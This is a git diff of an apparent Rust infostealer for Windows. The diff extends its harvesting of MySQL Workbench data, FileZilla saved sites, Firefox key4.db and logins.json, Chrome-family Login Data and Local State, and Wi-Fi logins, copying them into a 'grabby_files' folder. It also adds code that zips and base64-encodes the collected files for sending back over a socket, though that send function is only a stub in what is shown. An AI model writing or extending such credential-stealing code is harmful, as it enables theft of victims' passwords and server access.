@@ -1,12 +1,15 @@
 use std::env;
 use std::fs;
 use std::path::Path;
+use std::path::PathBuf;
 use std::process::Command;
 use std::ptr;
 use std::string::String;
 use lazy_static::lazy_static;
 use winapi::um::wincrypt::CRYPTOAPI_BLOB;
 use winapi::um::dpapi;
+use zip_extensions::write;
+use base64::{engine::general_purpose, Engine as _};
 
 
 lazy_static! {
@@ -64,6 +67,12 @@ fn main() -> std::io::Result<()> {
         
     // Wifi
     wifi_export();
+
+    // Add grabby_files to zip archive
+    let zipped_content_b64 = create_archive();
+
+    // Transmit data back over socket
+    send_back(zipped_content_b64);
     
     Ok(())
 }
@@ -71,7 +80,11 @@ fn main() -> std::io::Result<()> {
 
 fn mysqlworkbench_export() {
 
-    let myworkbench_user_data_file = format!("{}{}", USER_PROFILE.to_string(), "\\AppData\\Roaming\\MySQL\\Workbench\\workbench_user_data.dat");
+    let mut myworkbench_user_data_file = format!("{}{}", USER_PROFILE.to_string(), "\\AppData\\Roaming\\MySQL\\Workbench\\workbench_user_data.dat");
+
+    if !Path::new(&myworkbench_user_data_file).exists(){
+        myworkbench_user_data_file = format!("{}{}", USER_PROFILE.to_string(), "\\AppData\\Local\\MySQL\\Workbench\\workbench_user_data.dat");
+    }
 
     if Path::new(&myworkbench_user_data_file).exists(){
 
@@ -97,8 +110,14 @@ fn mysqlworkbench_export() {
 
 fn filezilla_export() {
 
-    let sitemanager = format!("{}{}", USER_PROFILE.to_string(), "\\AppData\\Roaming\\FileZilla\\sitemanager.xml");
-    let recentservers = format!("{}{}", USER_PROFILE.to_string(), "\\AppData\\Roaming\\FileZilla\\recentservers.xml");
+    let mut sitemanager = format!("{}{}", USER_PROFILE.to_string(), "\\AppData\\Roaming\\FileZilla\\sitemanager.xml");
+    let mut recentservers = format!("{}{}", USER_PROFILE.to_string(), "\\AppData\\Roaming\\FileZilla\\recentservers.xml");
+    
+    if !Path::new(&sitemanager).exists() || !Path::new(&recentservers).exists(){
+        sitemanager = format!("{}{}", USER_PROFILE.to_string(), "\\AppData\\Local\\FileZilla\\sitemanager.xml");
+        recentservers = format!("{}{}", USER_PROFILE.to_string(), "\\AppData\\Local\\FileZilla\\recentservers.xml");
+    }
+    
     if Path::new(&sitemanager).exists() && Path::new(&recentservers).exists(){
 
         fs::copy(sitemanager, "grabby_files/filezilla/sitemanager.xml").expect("err");
@@ -108,8 +127,15 @@ fn filezilla_export() {
 
 fn firefox_export() {
 
-    let key4 = format!("{}{}", USER_PROFILE.to_string(), "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\qatbpi71.default-release\\key4.db");
-    let logins = format!("{}{}", USER_PROFILE.to_string(), "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\qatbpi71.default-release\\logins.json");
+    let mut key4 = format!("{}{}", USER_PROFILE.to_string(), "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\qatbpi71.default-release\\key4.db");
+    let mut logins = format!("{}{}", USER_PROFILE.to_string(), "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\qatbpi71.default-release\\logins.json");
+    
+    if !Path::new(&key4).exists() || !Path::new(&logins).exists() {
+        
+        key4 = format!("{}{}", USER_PROFILE.to_string(), "\\AppData\\Local\\Mozilla\\Firefox\\Profiles\\qatbpi71.default-release\\key4.db");
+        logins = format!("{}{}", USER_PROFILE.to_string(), "\\AppData\\Local\\Mozilla\\Firefox\\Profiles\\qatbpi71.default-release\\logins.json");
+    }
+    
     if Path::new(&key4).exists() && Path::new(&logins).exists() {
 
         fs::copy(key4, "grabby_files/firefox/key4.db").expect("err");
@@ -119,8 +145,15 @@ fn firefox_export() {
 
 fn chrome_export(browser_path: &str) {
 
-    let local_state = format!("{}\\AppData\\Local\\{}\\User Data\\Local State", USER_PROFILE.to_string(), browser_path);
-    let login_data = format!("{}\\AppData\\Local\\{}\\User Data\\Default\\Login Data", USER_PROFILE.to_string(), browser_path);
+    let mut local_state = format!("{}\\AppData\\Local\\{}\\User Data\\Local State", USER_PROFILE.to_string(), browser_path);
+    let mut login_data = format!("{}\\AppData\\Local\\{}\\User Data\\Default\\Login Data", USER_PROFILE.to_string(), browser_path);
+    
+    if !Path::new(&local_state).exists() || !Path::new(&login_data).exists() {
+
+        local_state = format!("{}\\AppData\\Roaming\\{}\\User Data\\Local State", USER_PROFILE.to_string(), browser_path);
+        login_data = format!("{}\\AppData\\Roaming\\{}\\User Data\\Default\\Login Data", USER_PROFILE.to_string(), browser_path);    
+    }
+    
     if Path::new(&local_state).exists() && Path::new(&login_data).exists() {
         
         fs::copy(local_state, "grabby_files/chrome/Local State").expect("err");
@@ -182,4 +215,24 @@ fn wifi_export() {
         }
     }
     fs::write("grabby_files/wifi/logins.tsv", wifi_logins).expect("err");
+}
+
+fn create_archive() -> String {
+
+    // Add files to zip and return base64 contents
+
+    write::zip_create_from_directory(
+        &PathBuf::from(r"grabby_files.zip"), 
+        &PathBuf::from(r"grabby_files"))
+        .expect("err");
+
+    let contents = fs::read(
+        PathBuf::from(r"grabby_files.zip"))
+        .expect("err");
+
+    return general_purpose::STANDARD.encode(&contents);
+}
+
+fn send_back(zipped_content_b64: String) {
+    // Socket stuff
 }
